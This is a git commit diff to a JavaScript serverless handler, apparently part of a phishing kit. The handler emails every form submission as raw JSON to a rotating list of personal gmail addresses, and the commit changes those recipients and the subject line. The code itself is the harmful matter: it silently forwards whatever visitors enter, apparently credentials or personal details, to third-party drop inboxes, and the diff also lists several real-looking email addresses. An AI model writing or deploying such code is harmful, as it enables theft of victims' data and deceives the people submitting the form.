4151f395263d78be569fffd43feb554ae6870b9d
zm9807350 <zm9807350@gmail.com>
2026-01-28 10:21:36 +0500

    Update and rename abbas.js to kk.js

--- kk.js
+++ kk.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,sverified248@gmail.com",
-      subject: "Abbas",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,nizamaniaqsa41@gmail.com",
+      subject: "kk",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
